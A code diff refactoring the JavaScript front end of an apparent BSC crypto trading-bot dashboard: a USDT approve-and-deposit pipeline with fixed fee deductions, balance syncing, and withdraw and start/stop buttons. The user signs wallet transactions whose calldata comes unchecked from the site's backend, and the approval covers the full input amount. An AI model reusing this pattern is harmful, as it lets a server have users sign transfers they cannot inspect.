@@ -1,12 +1,12 @@
 logToPanel("main_prod.txt loaded (BEP20 Mode)");
 
 // ========================================================
-// 📱 PART A: DASHBOARD INITIALIZATION & UTILITIES
+// 📱 GLOBAL CORE CONFIGURATION METRICS & BASE URL
 // ========================================================
 window.API_BASE = window.location.origin; 
 window.WBNB_TOKEN_ADDRESS = "0xBB4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
 
-//🤹‍♂️🤹‍♂️Log to Panel
+// 🤹‍♂️ Dynamic Logging Facility
 function logToPanel(msg) {
   const panel = document.getElementById("logPanel");
   if (panel) {
@@ -18,8 +18,7 @@ function logToPanel(msg) {
 }
 window.logToPanel = logToPanel;
 
-
-//😵‍💫Query parameters 
+// 😵‍💫 URL Parameter Vector Discovery Mapping
 function getQueryParams() {
   try {
     const url = new URL(window.location.href);
@@ -39,7 +38,7 @@ window.USER_ID = q.userid;
 window.USER_ADDR = q.wallet ? q.wallet.toLowerCase() : null;
 window.WALLET_NAME = q.walletname;
 
-//👌Initialise Labels
+// 👌 Update Dashboard Label Visual Text Blocks
 function initializeLabels() {
   const userLabel = document.getElementById("currentUserLabel");
   const walletLabel = document.getElementById("currentWalletLabel");
@@ -49,13 +48,12 @@ function initializeLabels() {
   if (walletLabel) walletLabel.innerText = "Wallet Address: " + (window.USER_ADDR || "Not Connected");
   if (nameLabel) nameLabel.innerText = "Wallet Name: " + window.WALLET_NAME;
 }
-// ==================================================================
-// 🥞 PANCAKE_PROD.TXT — CASCADING FEE DEDUCTION PIPELINE ENGINE
-// ==================================================================
+
+// ========================================================
+// 🥞 DECIMAL MATRIX PARSING & SECURE CONTRACT DEPOSIT 
+// ========================================================
 window.logToPanel("pancake_prod.txt loaded safely. Sequential fee-deduction math active.");
 
-//🎉Ensure 18 decimals 
-// 🎉 CORRECTED: Fixed decimals translation matrix with clean return variables
 function ensure18Decimals(amountInput) {
     if (!amountInput) return "0";
     const str = amountInput.toString().trim();
@@ -80,85 +78,58 @@ function ensure18Decimals(amountInput) {
     return combined === "" ? "0" : combined;
 }
 
-
-// 🌟 DYNAMIC TRIPLE DEPOSIT ENGINE WITH SEQUENTIAL MATHEMATICAL DEDUCTIONS
 async function runDepositPipeline(userAddr, amountHumanOrWei) {
     try {
         const baseApiUrl = window.API_BASE || window.location.origin;
-        
-        // 1. Calculate Initial Total Base Amount in 18-Decimal Wei
         const totalInputWei = amountHumanOrWei.toString().length > 12 
             ? BigInt(amountHumanOrWei.toString()) 
             : BigInt(ensure18Decimals(amountHumanOrWei));
             
-        window.logToPanel(`[DEPOSIT START] Initial Input Parameter: ${(Number(totalInputWei) / 1e18).toFixed(4)} USDT (${totalInputWei.toString()} Wei)`);
+        window.logToPanel(`[DEPOSIT START] Initial Input: ${(Number(totalInputWei) / 1e18).toFixed(4)} USDT`);
         
-        // Fixed Constant Deductions in 18-decimal base representation (0.03 USDT = 30000000000000000 Wei)
-        const fixedGasDeductionWei = 30000000000000000n; 
-        
+        const fixedGasDeductionWei = 30000000000000000n; // Fixed 0.03 USDT
         const v12ContractAddress = "0x1854170353ea89672638F9fa5acB477c45523871";
         const usdtTokenAddress = "0x55d398326f99059fF775485246999027B3197955";
 
-        // ----------------------------------------------------------
-        // 🌟 STEP 1/3: ERC-20 APPROVE VALUE (DEDUCT FIRST \$0.03)
-        // ----------------------------------------------------------
         if (totalInputWei <= fixedGasDeductionWei) {
-            throw new Error("Input amount is insufficient to cover the basic gas allowance deduction threshold.");
+            throw new Error("Input amount is insufficient to cover gas allocation thresholds.");
         }
         
-        // Compute Pool Balance after first deduction allocation
         const remainingPoolBalanceWei = totalInputWei - fixedGasDeductionWei;
-        window.logToPanel(`[STEP 1] Deducting $0.03 approval cost. Available trading pool balance: ${(Number(remainingPoolBalanceWei) / 1e18).toFixed(4)} USDT`);
-        
         window.logToPanel(`[STAGE 1/3] Prompting wallet to authorize token spend allowance...`);
+        
         const cleanSpender = v12ContractAddress.toLowerCase().replace("0x", "").padStart(64, "0");
-        const cleanValue = BigInt(totalInputWei).toString(16).padStart(64, "0"); // Approve total entry parameters
+        const cleanValue = BigInt(totalInputWei).toString(16).padStart(64, "0"); 
         const approveCalldata = "0x095ea7b3" + cleanSpender + cleanValue;
         
         const txHash1 = await window.ethereum.request({
             method: 'eth_sendTransaction',
             params: [{ from: userAddr, to: usdtTokenAddress, data: approveCalldata, value: '0x0' }],
         });
-        window.logToPanel(`⏳ Stage 1 complete. Allowance Hash: ${txHash1}. Synchronizing block status...`);
         await new Promise(resolve => setTimeout(resolve, 5000)); 
 
-        // ----------------------------------------------------------
-        // 🌟 STEP 2/3: depositCommissionFirst WITH commissionPaid = false (4% OF POOL)
-        // ----------------------------------------------------------
-        // Calculate exactly 4% (0.04 factor) of the adjusted pool balance safely using BigInt scaling math
+        // 🌟 STEP 2/3: Core deposit pipeline (commissionPaid = false)
         const step2TxAmountWei = (remainingPoolBalanceWei * 4n) / 100n;
-        window.logToPanel(`[STEP 2] Computed 4% asset fraction: ${(Number(step2TxAmountWei) / 1e18).toFixed(4)} USDT (${step2TxAmountWei.toString()} Wei)`);
-        
-        window.logToPanel(`[STAGE 2/3] Requesting signature payload for core deposit (commissionPaid = false)...`);
         const res = await fetch(`${baseApiUrl}/prodbot/deposit/usdt/pipeline`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ amount: step2TxAmountWei.toString(), tradingPhase: false })
         });
         const data = await res.json();
-        if (!data || data.status !== "ok") throw new Error(data.message || "Failed API payload parsing.");
+        if (!data || data.status !== "ok") throw new Error(data.message || "Failed API payload.");
         
         const txHash2 = await window.ethereum.request({
             method: 'eth_sendTransaction',
             params: [{ from: userAddr, to: v12ContractAddress, data: data.txdata, value: '0x0' }],
         });
-        window.logToPanel(`⏳ Stage 2 complete. Core Deposit Hash: ${txHash2}. Synchronizing block status...`);
         await new Promise(resolve => setTimeout(resolve, 5000));
 
-        // ----------------------------------------------------------
-        // 🌟 STEP 3/3: depositCommissionFirst WITH commissionPaid = true (REMAINDER MINUS \$0.03)
-        // ----------------------------------------------------------
-        // Remaining 96% chunk calculation
+        // 🌟 STEP 3/3: Remaining token allocation tracking (commissionPaid = true)
         const remainderChunkWei = remainingPoolBalanceWei - step2TxAmountWei;
-        
-        // Deduct second fixed \$0.03 gas allowance step from the remainder
         if (remainderChunkWei <= fixedGasDeductionWei) {
-            throw new Error("Remaining pool capital is depleted past fixed execution boundary limits.");
+            throw new Error("Pool capital depleted below execution bounds.");
         }
         const step3TxAmountWei = remainderChunkWei - fixedGasDeductionWei;
-        
-        window.logToPanel(`[STEP 3] Final net transfer amount (Remainder minus $0.03): ${(Number(step3TxAmountWei) / 1e18).toFixed(4)} USDT (${step3TxAmountWei.toString()} Wei)`);
-        window.logToPanel(`[STAGE 3/3] Requesting signature payload for fee tracking (commissionPaid = true)...`);
         
         const secondRes = await fetch(`${baseApiUrl}/prodbot/deposit/usdt/pipeline`, {
             method: "POST",
@@ -166,7 +137,6 @@ async function runDepositPipeline(userAddr, amountHumanOrWei) {
             body: JSON.stringify({ amount: step3TxAmountWei.toString(), tradingPhase: true })
         });
         const secondData = await secondRes.json();
-        if (!secondData || secondData.status !== "ok") throw new Error("Failed to compile final stage data.");
         
         const txHash3 = await window.ethereum.request({
             method: 'eth_sendTransaction',
@@ -174,77 +144,32 @@ async function runDepositPipeline(userAddr, amountHumanOrWei) {
         });
         
         window.logToPanel(`🎉 Cascading Pipeline Fully Settled! Master Final Hash: ${txHash3}`);
-        
-        // Refresh values inside dashboard layout view instantly
-        if (typeof window.syncBalanceFromFund === "function") {
-            await window.syncBalanceFromFund();
-        }
+        if (typeof window.syncBalanceFromFund === "function") await window.syncBalanceFromFund();
         return { status: "ok", tx_hash: txHash3 };
         
     } catch (err) {
-        window.logToPanel(`❌ Downscaling Pipeline Break: ${err.message}`);
+        window.logToPanel(`❌ Pipeline Break: ${err.message}`);
         return { status: "error", message: err.message };
     }
 }
 window.runDepositPipeline = runDepositPipeline;
 
-// 🌟 NATIVE CAPITAL WITHDRAW ROUTER
-async function runWithdrawPipeline(userAddr, amountHumanOrWei) {
-    try {
-        const baseApiUrl = window.API_BASE || window.location.origin;
-        const finalWeiAmount = amountHumanOrWei.toString().length > 12 ? amountHumanOrWei.toString() : ensure18Decimals(amountHumanOrWei);
-        
-        window.logToPanel(`[WITHDRAW] Packaging withdrawUserCapital data for: ${finalWeiAmount} Wei...`);
-        
-        const res = await fetch(`${baseApiUrl}/prodbot/withdraw`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ token: "0x55d398326f99059fF775485246999027B3197955", amount: finalWeiAmount })
-        });
-
-        const data = await res.json();
-        if (data && data.status === "ok") {
-            const txHash = await window.ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [{
-                    from: userAddr,
-                    to: "0x1854170353ea89672638F9fa5acB477c45523871",
-                    data: data.withdraw_call,
-                    value: '0x0'
-                }],
-            });
-            window.logToPanel(`✅ Withdrawal Transaction Sent! Hash: ${txHash}`);
-            return { status: "ok", tx_hash: txHash };
-        } else {
-            throw new Error(data.message || "Invalid payload formulation.");
-        }
-    } catch (err) {
-        window.logToPanel(`❌ Withdrawal Action Interrupted: ${err.message}`);
-        return { status: "error", message: err.message };
-    }
-}
-window.runWithdrawPipeline = runWithdrawPipeline;
-
-
-
-// 📊 RAW PLAIN-TEXT LEDGER BALANCE SYNCHRONIZER WITH DYNAMIC SLOT DISCOVERY
-// ====================================================================
-// 📊 ON-CHAIN LEDGER SYNCHRONIZER (POWERED BY GETUSERBALANCELIST ROUTE)
-// ====================================================================
+// ========================================================
+// 📊 ON-CHAIN REGISTRY SYNCHRONIZATION MATRIX
+// ========================================================
 async function syncBalanceFromFund() {
     try {
         const baseApiUrl = window.API_BASE || window.location.origin;
         if (!window.USER_ADDR) {
-            logToPanel("⚠️ Wallet context missing. Halting balance initialization cycles.");
+            logToPanel("⚠️ Wallet address vector missing. Aborting tracking loop.");
             return null;
         }
 
-        logToPanel(`🔎 Fetching decentralized registry from ledger for: ${window.USER_ADDR}...`);
-        
-        let resolvedTokenAddress = "0x55d398326f99059fF775485246999027B3197955"; // Default fallback (USDT)
+        logToPanel(`🔎 Inspecting decentralized tuple mappings for: ${window.USER_ADDR}...`);
+        let resolvedTokenAddress = "0x55d398326f99059fF775485246999027B3197955"; 
         let finalWeiString = "0";
 
-        // 🟢 STEP 1: Query the raw getUserBalanceList endpoint mapping array lists
+        // 🟢 PHASE 1: Query the user's active array via getUserBalanceList
         try {
             const ledgerRes = await fetch(`${baseApiUrl}/prodbot/ledger/balances`, {
                 method: "POST",
@@ -254,30 +179,22 @@ async function syncBalanceFromFund() {
             const ledgerData = await ledgerRes.json();
             
             if (ledgerData && ledgerData.status === "ok" && ledgerData.tokens.length > 0) {
-                // Loop arrays to locate the active asset slot holding a balance
                 for (let i = 0; i < ledgerData.tokens.length; i++) {
-                    const tokenAddr = ledgerData.tokens[i];
-                    const tokenBalWei = ledgerData.balances[i];
-                    
-                    if (BigInt(tokenBalWei) > 0n) {
-                        resolvedTokenAddress = tokenAddr;
-                        finalWeiString = tokenBalWei;
+                    if (BigInt(ledgerData.balances[i]) > 0n) {
+                        resolvedTokenAddress = ledgerData.tokens[i];
+                        finalWeiString = ledgerData.balances[i];
                         break;
                     }
                 }
-                
-                // Fallback allocation if all array address balances are currently zero
                 if (finalWeiString === "0" && ledgerData.tokens.length > 0) {
                     resolvedTokenAddress = ledgerData.tokens[0];
                 }
             }
         } catch (ledgerErr) {
-            console.error("On-chain ledger routing query dropped:", ledgerErr);
+            console.error("Ledger router lookup bypassed:", ledgerErr);
         }
 
-        logToPanel(`💡 Active Ledger Target Resolved -> [Token: ${resolvedTokenAddress}]`);
-
-        // 🟢 STEP 2: Double-check the precise individual balance coordinate via the contract route
+        // 🟢 PHASE 2: Force exact value synchronization directly from mapping storage
         try {
             const balanceCheckRes = await fetch(`${baseApiUrl}/prodbot/balance`, {
                 method: "POST",
@@ -289,27 +206,25 @@ async function syncBalanceFromFund() {
                 finalWeiString = freshBalText.trim();
             }
         } catch (balErr) {
-            console.error("Direct position query validation exception:", balErr);
+            console.error("Direct ledger verification exception:", balErr);
         }
 
-        logToPanel("[LEDGER SYNC] Process complete. Final active balance: " + finalWeiString);
+        logToPanel("[LEDGER SYNC] Succeeded. Live Balance Units: " + finalWeiString);
         window.SolidarityFundBalance = parseFloat(finalWeiString);
 
-        // 🟢 STEP 3: Inject authenticated backend data directly into user forms
+        // 🟢 PHASE 3: Write balance data into starting and investment form text inputs
         const startBox = document.getElementById("startBalance");
         const investBox = document.getElementById("investBalance");
         const usdBox = document.getElementById("usd");
 
-        // Force update both starting balance and investment balance input controls
         if (startBox) startBox.value = finalWeiString;
         if (investBox) investBox.value = finalWeiString;
         
-        // 🟢 STEP 4: Market valuation and decimal downscaling sync framework
+        // 🟢 PHASE 4: Fetch live market data to compute actual floating valuation changes
         if (usdBox) {
             try {
                 const marketRes = await fetch(`${baseApiUrl}/prodbot/market-analysis`);
                 const marketData = await marketRes.json();
-                
                 const activeTickerList = [
                     ...(marketData.data?.short_term || marketData.short_term || []),
                     ...(marketData.data?.mid_term || marketData.mid_term || []),
@@ -317,40 +232,90 @@ async function syncBalanceFromFund() {
                 ];
 
                 const lowerAddress = resolvedTokenAddress.toLowerCase();
-                const matchedToken = activeTickerList.find(token => 
-                    token.address && token.address.toLowerCase() === lowerAddress
-                );
+                const matchedToken = activeTickerList.find(t => t.address && t.address.toLowerCase() === lowerAddress);
 
                 if (matchedToken && matchedToken.price) {
-                    let decimals = 18;
-                    if (lowerAddress === "0xc748673057861a797275cd8a068abb95a902e8de") {
-                        decimals = 9; // BabyDoge decimal configuration override constraint
-                    }
-
+                    let decimals = lowerAddress === "0xc748673057861a797275cd8a068abb95a902e8de" ? 9 : 18;
                     const tokenCount = parseFloat(finalWeiString) / Math.pow(10, decimals);
-                    const trueUsdValuation = tokenCount * parseFloat(matchedToken.price);
-                    usdBox.value = trueUsdValuation.toFixed(4);
-                    logToPanel(`📈 Authenticated Ticker Price: 1 ${matchedToken.symbol} = $${matchedToken.price}. Valuation updated.`);
+                    usdBox.value = (tokenCount * parseFloat(matchedToken.price)).toFixed(4);
                 } else {
-                    // Default 1:1 downscaling calculation for dollar tracking matches like USDT
                     usdBox.value = (parseFloat(finalWeiString) / 1e18).toFixed(4);
                 }
             } catch (apiErr) {
-                console.error("Failed to compile valuation analysis:", apiErr);
                 usdBox.value = (parseFloat(finalWeiString) / 1e18).toFixed(4);
             }
         }
         return window.SolidarityFundBalance;
     } catch (err) {
-        logToPanel("❌ Balance Sync Error: " + err.message);
+        logToPanel("❌ Synchronization breakdown: " + err.message);
         return null;
     }
 }
 window.syncBalanceFromFund = syncBalanceFromFund;
 
 
+// ========================================================
+// 🎛️ OPERATIONAL INTERFACE BUTTON LISTENERS & EXECUTION
+// ========================================================
+function setupActionListeners() {
+  
+  // Dynamic Capital Processing Router Pipeline
+  document.getElementById("withdrawBtn")?.addEventListener("click", async () => {
+    if (!window.USER_ADDR) return logToPanel("❌ Connect wallet first.");
+    const inputAmount = document.getElementById("withdrawAmount").value;
+    if (!inputAmount || parseFloat(inputAmount) <= 0) return logToPanel("❌ Specify a valid amount.");
 
-// 🤓Secure page entry setup executor function container loop mapping 
+    const amountWei = ensure18Decimals(inputAmount);
+    logToPanel(`🔄 Packaging withdrawal data parameters for: ${amountWei} Wei...`);
+
+    try {
+      const res = await fetch(`${window.API_BASE}/prodbot/withdraw`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token: "0x55d398326f99059fF775485246999027B3197955", amount: amountWei })
+      });
+      const data = await res.json();
+      if (data && data.status === "ok") {
+        const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{ from: window.USER_ADDR, to: "0x1854170353ea89672638F9fa5acB477c45523871", data: data.withdraw_call, value: '0x0' }],
+        });
+        logToPanel(`✅ Withdrawal Sent! Hash: ${txHash}`);
+      }
+    } catch (err) {
+      logToPanel(`❌ Withdrawal Action Interrupted: ${err.message}`);
+    }
+  });
+}
+
+// 🔗 Master Interface Splicing Post Extension Activation Link
+async function finalizeInterfaceSyncState() {
+    const label = document.getElementById("currentWalletLabel");
+    if (label) label.innerText = "Wallet Address: " + window.USER_ADDR;
+    window.logToPanel(`🎉 Sync Success! Active Wallet Session: ${window.USER_ADDR}`);
+    if (typeof window.syncBalanceFromFund === "function") await window.syncBalanceFromFund();
+}
+window.finalizeInterfaceSyncState = finalizeInterfaceSyncState;
+
+// 🚀 Core Automated Multi-Network Loop Hooks
+const strtBtn = document.getElementById("startBtn");
+if (strtBtn) {
+  strtBtn.onclick = function() {
+    logToPanel("▶️ Launching orchestration loop from interface dashboard...");
+    if (typeof window.startSimulation === "function") window.startSimulation(10);
+  };
+}
+
+const stpBtn = document.getElementById("stopBtn");
+if (stpBtn) {
+  stpBtn.onclick = function() {
+    logToPanel("⏹ Safety Stop loop activation sequence engaged.");
+    window.isBotRunning = false;
+    if (typeof window.setStatus === "function") window.setStatus("STOPPED");
+  };
+}
+
+// 🤓 Protected Dashboard Bootstrapper Pipeline
 function initDashboardPipeline() {
   initializeLabels();
   setupActionListeners();
@@ -363,218 +328,9 @@ function initDashboardPipeline() {
   }
 }
 
-
-// Clean initialization call wrapping to resolve layout script errors completely
+// ========================================================
+// 🟢 MASTER ENTRY ENGINE LISTENER (GUARANTEES SYNC ON LOAD)
+// ========================================================
 window.addEventListener("DOMContentLoaded", () => {
     initDashboardPipeline();
 });
-
-
-// ========================================================
-// 📱 PART B: DEPOSIT & WITHDRAW PIPELINE ACTIONS
-// ========================================================
-function setupActionListeners() {
-  
-  // 🌟 CORRECTED UNIFIED DEPOSIT PROCESSOR
-  document.getElementById("depositBtn")?.addEventListener("click", async () => {
-    if (!window.USER_ADDR) return logToPanel("❌ Connect wallet first.");
-    
-    const inputAmount = document.getElementById("depositAmount").value;
-    if (!inputAmount || parseFloat(inputAmount) <= 0) {
-        return logToPanel("❌ Please specify a valid deposit amount.");
-    }
-
-    logToPanel(`🔄 Initiating secure deposit sequence for ${inputAmount} USDT...`);
-    
-    if (typeof window.runDepositPipeline === "function") {
-        // Triggers the multi-stage token approve + execution deposit flow
-        await window.runDepositPipeline(window.USER_ADDR, inputAmount, false);
-    } else {
-        logToPanel("❌ Operational Failure: runDepositPipeline engine is missing from the landscape.");
-    }
-  });
-
-  // 🌟 CORRECTED WITHDRAW PROCESSOR
-  document.getElementById("withdrawBtn")?.addEventListener("click", async () => {
-    if (!window.USER_ADDR) return logToPanel("❌ Connect wallet first.");
-    
-    const inputAmount = document.getElementById("withdrawAmount").value;
-    if (!inputAmount || parseFloat(inputAmount) <= 0) {
-        return logToPanel("❌ Please specify a valid withdrawal amount.");
-    }
-
-    // Convert human readable text safely to 18 decimals configuration format
-    const amountWei = ensure18Decimals(inputAmount);
-    logToPanel(`🔄 Compiling withdraw parameters for raw units: ${amountWei}`);
-
-    try {
-      const res = await fetch(`${window.API_BASE}/prodbot/withdraw`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ token: "0x55d398326f99059fF775485246999027B3197955", amount: amountWei })
-      });
-
-      const data = await res.json();
-      if (data && data.status === "ok") {
-        logToPanel(`[INFO] Sending payload signature token to wallet...`);
-        
-        const txHash = await window.ethereum.request({
-            method: 'eth_sendTransaction',
-            params: [{
-                from: window.USER_ADDR,
-                to: "0x1854170353ea89672638F9fa5acB477c45523871", // V12 address container destination
-                data: data.withdraw_call,
-                value: '0x0'
-            }],
-        });
-        logToPanel(`✅ Withdrawal Transaction Sent! Hash: ${txHash}`);
-      } else {
-        logToPanel(`❌ Withdrawal formulation skipped: ${data.message || "Invalid setup parameters"}`);
-      }
-    } catch (err) {
-      logToPanel(`❌ Withdrawal tracking error: ${err.message}`);
-    }
-  });
-}
-
-
-
-// Extension provider initialization framework bindings
-// ========================================================
-// ⚡ REOWN / WALLETCONNECT DIRECT LIGHTWEIGHT RPC ENGINE
-// ========================================================
-
-// Configuration - Replace with your actual Project ID from cloud.reown.com
-const REOWN_PROJECT_ID = "db6af3372f722385b2e4c5df24341c63";
-const BSC_CHAIN_ID_CAIP = "eip155:56"; // Exact BSC Mainnet identifier map
-
-/**
- * Robust JSON-RPC programmatic dispatcher targeting the raw WalletConnect API gateway
- * @param {string} method - The standard Ethereum JSON-RPC method name (e.g., eth_blockNumber)
- * @param {Array} params - Parameters array corresponding to the target execution call
- */
-// ========================================================
-// ⚡ SECURE PROXY-ROUTED PROGRAMMATIC RPC DISPATCHER
-// ========================================================
-// ========================================================
-// ⚡ SECURE PUBLIC-ROUTED NATIVE PROGRAMMATIC RPC DISPATCHER
-// ========================================================
-
-// ========================================================
-// 📱 PART B: DYNAMIC WALLET ROUTER & INTERFACE SYNCHRONIZER
-// ========================================================
-
-
-
-/**
- * 🔗Updates UI layout parameters and fires parallel on-chain sync checks
- */
-async function finalizeInterfaceSyncState() {
-    const label = document.getElementById("currentWalletLabel");
-    if (label) {
-        label.innerText = "Wallet Address: " + window.USER_ADDR;
-    }
-    
-    window.logToPanel(`🎉 Interface Sync Success! Active Wallet Session: ${window.USER_ADDR}`);
-
-    // This guarantees that as soon as the wallet links, the 0 values are overwritten with contract funds
-    if (typeof window.syncBalanceFromFund === "function") {
-        await window.syncBalanceFromFund();
-    }
-}
-window.finalizeInterfaceSyncState = finalizeInterfaceSyncState;
-
-
-
-    // 🟢 KEEP ONLY THIS SIMPLIFIED ENGINE LISTENER WRAPPER
-window.addEventListener("DOMContentLoaded", () => {
-    initializeLabels();
-    setupActionListeners();
-});
-
-
-//🎉 connect button 
-document.getElementById("pipelineBackdrop");
-            
-            if (pipelineForm) pipelineForm.style.display = "block";
-            if (pipelineBackdrop) pipelineBackdrop.style.display = "block";
-            
-            // Trigger Reown's wallet options grid selection modal window
-            if (window.reownAppKitInstance) {
-                window.reownAppKitInstance.open();
-                window.ethereum_is_reown_rpc = true;
-            } else {
-                // Programmatic click fallback targeting the shadow DOM button container
-                window.logToPanel("⏳ Triggering selector interface layer...");
-                const appKitButton = document.querySelector('appkit-button');
-                if (appKitButton) {
-                    appKitButton.click();
-                    window.ethereum_is_reown_rpc = true;
-                } else {
-                    window.logToPanel("❌ Error: Connection engine custom layout tags missing from template.");
-                }
-            }
-        };
-    }
-});
-
-
-
-
-
-
-
-// ========================================================
-// 🚀 DEPOSIT & TRADING LIFE-RINGS
-// ========================================================
-function getSelectedToken() {
-  const el = document.getElementById("tokenSelect");
-  if (!el) return "USDT";
-  const val = el.value.toLowerCase();
-  if (val === "0x55d398326f99059ff775485246999027b3197955" || val === "usdt") return "USDT";
-  if (val === "bnb") return "BNB";
-  if (val === "eth") return "ETH";
-  return "USDT";
-}
-
-
-
-// ========================================================
-// 📱 PART C: TRADING Lifecycles & WALLET WRAPPER HOOKS
-// ========================================================
-// ========================================================
-// 📱 PART C: TRADING Lifecycles & WALLET WRAPPER HOOKS (CORRECTED)
-// ========================================================
-const strtBtn = document.getElementById("startBtn");
-if (strtBtn) {
-  strtBtn.onclick = function() {
-    logToPanel("▶️ Launching orchestration loop from interface dashboard...");
-    
-    const investBox = document.getElementById("investBalance");
-    let prefixedVolume = investBox ? investBox.value.trim() : "0";
-    
-    if (prefixedVolume === "0" || prefixedVolume === "") {
-        logToPanel("⚠️ Warning: Prefixed Investment Balance is empty or set to 0.");
-    } else {
-        logToPanel(`💾 Prefixed execution value locked: ${prefixedVolume} Wei units.`);
-    }
-
-    if (typeof window.startSimulation === "function") {
-      window.startSimulation(10);
-    } else {
-      logToPanel("❌ Execution Exception: startSimulation engine method missing from context maps.");
-    }
-  };
-}
-
-//👏 stop button 
-const stpBtn = document.getElementById("stopBtn");
-if (stpBtn) {
-  stpBtn.onclick = function() {
-    logToPanel("⏹ Safety Stop loop activation sequence engaged.");
-    window.isBotRunning = false;
-    if (typeof window.setStatus === "function") {
-        window.setStatus("STOPPED");
-    }
-  };
-} // 🟢 FIXED: Closed all statement loops cleanly
